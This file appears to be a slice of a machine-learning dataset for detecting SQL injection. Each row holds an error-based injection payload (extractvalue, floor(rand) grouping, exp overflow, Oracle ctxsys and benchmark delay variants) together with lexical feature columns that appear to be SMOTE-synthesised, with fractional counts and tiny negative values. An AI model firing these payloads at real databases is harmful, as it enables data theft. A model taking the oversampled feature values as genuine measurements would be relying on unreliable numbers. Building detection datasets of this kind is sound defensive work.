id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000737,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R000110,0.6528666225927076,223.3523239635844,32.0,3.9264110745815035,81.0,38.67616198179221,79.04760123862013,24.62856074317208,0.3629518828765343,0.17289521666682708,0.3539482088470116,0.11020469160962695,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.2095202477240266,0.0,14.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.6285607431720788,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.2095202477240263,0.0,0.20952024772402641,0.0,0.7904797522759736,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.2095202477240266
SMOTE_000738,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,0.7121289769876197,280.49787094830975,37.44397132184662,4.0102384485437845,107.27801433907669,35.0,102.77588528738646,35.44397132184662,0.382559204901725,0.1248042933740316,0.36629567314175343,0.12634082858249002,4.0,0.0,0.0,0.0,2.0,2.0,0.0,19.443971321846615,2.7755575615628914e-17,2.0,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.278014339076692,0.721985660923308,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000739,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000058,0.32774874752920163,211.13176007197686,38.28941330934105,3.7879827813787927,63.0,37.0,88.13176007197686,23.0,0.2984223098430449,0.17526389625702637,0.4173659664969123,0.10894782740301641,0.14470665467052357,0.0,1.0,0.0,1.0,1.0,0.0,15.855293345329475,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,0.14470665467052357,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000740,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000154,0.05311547239568214,217.49733141233583,38.100533717532834,3.74903048017965,63.0,37.0,92.59786512986867,24.899466282467166,0.2896728285528458,0.17012531200722691,0.4257243135841008,0.11447754585582648,1.0,0.0,1.0,0.0,1.0,1.0,0.0,16.899466282467166,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000741,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000132,0.1520885766579824,324.42263619676703,40.67782952459588,4.0390914619307825,108.06697714757527,63.0,118.35565904919176,35.0,0.33304968264370444,0.19421715337113954,0.3648347454456341,0.10789841853952195,0.0,1.0,2.0,0.0,2.0,2.0,0.0,21.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000742,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000084,1.1010656958862102,308.44793423467945,37.44400822066507,4.013711031682585,107.44597122767227,55.0,111.88997944833734,34.11198355866987,0.3483012624680969,0.17839747506380618,0.36277565206343626,0.11052561040466062,3.11198355866987,0.0,0.0,0.0,2.0,1.7779958896674675,0.0,20.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.7779958896674675,0.7779958896674676,0.0,0.0,0.2220041103325325,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,0.7779958896674676,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.777995889667467
SMOTE_000743,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",nearest_attack_euclidean,R000137,0.7606220111235485,192.46263911352264,29.253736088647738,3.5654718046587592,50.23879173405679,35.0,81.47758346811358,25.746263911352266,0.26101094368264505,0.18194892948098984,0.42324961136132416,0.13379051547504098,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.2537360886477367,0.0,15.492527822704528,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.2537360886477362,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.2537360886477367,0.7462639113522633,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000744,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000132,0.542459187871636,327.0,40.82954818227134,4.052878710253291,110.0,63.0,119.0,35.0,0.3363914373088685,0.1926605504587156,0.363914373088685,0.10703363914373089,0.17045181772866136,0.8295481822713386,2.0,0.0,2.0,2.0,0.0,21.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.1704518177286612,0.8295481822713385,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000745,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000111,0.12956668282273423,248.82976385366865,35.03073199458032,3.99045513071171,94.49171191328512,35.0,89.27658795122288,30.06146398916064,0.37967663859603895,0.14070320036835188,0.35879391244760656,0.12082624858800263,0.030731994580320166,0.0,0.0,0.0,2.0,1.0,0.0,18.03073199458032,2.7755575615628914e-17,2.0,5.96926800541968,3.0,0.030731994580320054,0.0,0.0,0.03073199458032018,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,0.030731994580319943,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.03073199458032
SMOTE_000746,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000041,0.2540405280438597,193.14370251223465,28.190288330614525,3.5006469232361246,47.09514416530726,35.0,84.2388466775419,26.809711669385475,0.24390370437432657,0.18124743416193334,0.4360579978239951,0.13879086363974497,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,15.809711669385475,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.095144165307262,0.9048558346927379,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000747,attack,error,"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000059,1.5576955815788616,318.7622340159564,38.0,3.9554602246524633,105.73525831306803,55.0,120.21079028115533,37.81618542173299,0.33154716455027927,0.1725621852992358,0.3771934339157656,0.11869721623471928,0.0,4.0,0.0,0.0,2.0,1.6053951405776639,0.0,22.0,1.2107902811553273,-1.1102230246251565e-16,6.0,4.605395140577663,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000748,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'efwq' like 'efwq",nearest_attack_euclidean,R000115,0.33923721008979457,201.15489703122375,31.57744851561188,3.6074703954808767,56.837983417932676,32.31691361329109,85.0,27.0,0.2823897270238701,0.16073950813732876,0.4226251340294473,0.13424563080935384,4.0,0.0,0.0,0.0,0.8943621289029703,1.1056378710970296,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,4.10563787109703,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.7887242578059404,0.0,0.0,0.8943621289029703,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.683086386708911
SMOTE_000749,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000023,1.1245667765738878,188.7594845698751,29.462930775732126,3.6320619702587034,51.759484569875106,33.388792327196384,78.07413844853575,25.537069224267874,0.273959723707007,0.17709303548946234,0.4136609037471489,0.1352863370563817,4.0,0.0,0.0,0.0,0.5370692242678725,2.0,0.0,14.0,2.7755575615628914e-17,-1.1102230246251565e-16,4.4629307757321275,2.5370692242678725,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.074138448535745,0.0,0.0,0.5370692242678724,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.6112076728036175
SMOTE_000750,attack,error,"1'  )   where 9544  =  9544 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000044,0.35872835483351556,196.02277149585728,32.67425716528576,3.6416237065933323,48.0,40.0,82.34851433057152,25.67425716528576,0.2449014528981543,0.20408454408179522,0.4200645092344974,0.13094949378555307,0.8371285826428788,0.0,2.0,0.0,1.0,2.0,0.0,14.83712858264288,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,0.8371285826428789,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000751,attack,error,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",nearest_attack_euclidean,R000125,0.28659550005615836,325.67661469725334,38.883625447945505,3.9812224620316923,112.53450179178203,55.0,121.56024014519883,36.58187276027246,0.34579346997938376,0.16896138255562076,0.37297052933952,0.11227461812547546,4.0,0.0,0.0,0.0,2.0,1.1163745520544923,0.0,22.46549820821797,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.116374552054492,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000752,attack,error,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph",nearest_attack_euclidean,R000038,0.23877556500869934,214.29042652268885,30.311201560158167,3.47853830243183,55.0,32.0,97.35682184221436,29.933604680474502,0.2582048889484724,0.15022829902456575,0.4521009886249248,0.13946582340203711,4.0,0.0,0.0,0.0,1.0,2.0,0.0,17.933604680474502,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000753,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxvw""  =  ""oxvw",nearest_attack_euclidean,R000019,2.1264946234780573,217.39666725537646,29.52066654892471,3.354748926211791,50.64466584247297,32.0,102.83466760860232,31.917333804301162,0.23317511890785117,0.1472157853663415,0.4728791432889478,0.14672995243685955,0.0,4.0,0.0,0.0,1.0,2.0,0.0,18.958666902150583,0.9586669021505809,-1.1102230246251565e-16,4.0,3.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.4793334510752905,0.5206665489247096,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000754,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000052,2.86780818920678,336.70903622585877,32.718222830605946,3.3773556444354877,77.43644566121189,50.29096377414126,151.5543677340409,57.427259056464685,0.23003994539195421,0.14939992938486915,0.45000831155662685,0.17055181366654976,0.0,0.0,1.0,0.0,1.1102230246251565e-16,2.0,0.0,31.85451811292937,2.7755575615628914e-17,-1.1102230246251565e-16,0.5727409435353148,22.999999999999996,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.5727409435353147,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4272590564646853,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000755,attack,error,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""ymhg""  =  ""ymhg",nearest_attack_euclidean,R000085,0.9060112104822117,345.0447838127576,37.52239190637881,3.8303355666298873,107.08956762551523,56.91043237448478,141.0,40.044783812757615,0.3103227272659778,0.16498957587017937,0.408652650867062,0.11603504599678084,0.0,3.0447838127576117,0.0,0.0,2.0,2.0,0.0,26.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,0.0,0.7611959531894028,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000756,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000017,1.0158384485311576,193.83831344110283,29.61277114703428,3.5987082802582893,48.872288529657204,36.289398029239955,81.45108458813712,27.22554229406856,0.25233365807781855,0.18709237156780933,0.42014907796675216,0.1404248923876199,4.0,0.0,0.0,0.0,0.3872288529657203,2.0,0.0,15.225542294068559,2.7755575615628914e-17,-1.1102230246251565e-16,5.22554229406856,2.3872288529657206,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.7744577059314406,0.0,0.0,0.3872288529657203,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.161686558897161
SMOTE_000757,attack,error,"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000066,0.3667420206909794,219.58666314861262,29.082667370277477,3.2943988758099807,47.57867159194234,32.0,106.33866103778018,33.66933051889009,0.21673857467743174,0.14573418137937413,0.48422267381416684,0.15330457012902732,0.0,4.0,0.0,0.0,1.0,2.0,0.0,19.834665259445046,1.8346652594450468,-1.1102230246251565e-16,4.0,3.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.9173326297225235,0.0826673702774765,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000758,attack,error,"1   )    )    as qzmg where 4344  =  4344 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000150,1.4209700521327966,187.17562120127204,36.65268636038161,3.909296798450459,62.82830756165365,31.782437879872795,70.91218939936398,21.65268636038161,0.3352099688656855,0.16992740483259217,0.3792684771279487,0.11559414917377368,0.6526863603816115,0.0,1.5648757597455925,0.0,1.1102230246251565e-16,1.0,0.0,13.782437879872795,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,0.21756212012720377,0.0,0.7824378798727961,0.217562120127204,0.0,1.0,1.0,0.0,0.0,1.0,0.21756212012720397,0.21756212012720422,0.0,1.0,0.21756212012720388,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4351242402544075
SMOTE_000759,attack,error,"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ngnd"" like ""ngnd",nearest_attack_euclidean,R000092,1.587935505453577,320.18414206204346,38.0,3.9665841148755803,108.17281496350304,55.0,119.80453083941616,37.20679625912424,0.3376867498158147,0.17179598097922572,0.3742500152422723,0.11626725396268728,0.0,4.0,0.0,0.0,2.0,1.402265419708079,0.0,22.0,0.8045308394161581,-1.1102230246251565e-16,6.0,4.402265419708079,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000760,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,0.08336884312374876,303.5412641138024,36.0,3.7942660855803902,100.18349435447902,42.81650564552097,124.54126411380243,36.0,0.33012481319937664,0.14102973683451714,0.41023311569183923,0.11861233427426696,0.09174717723951398,0.0,0.0,0.0,2.0,2.0,0.0,23.90825282276049,2.7755575615628914e-17,2.0,5.0,4.0,0.022936794309878494,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
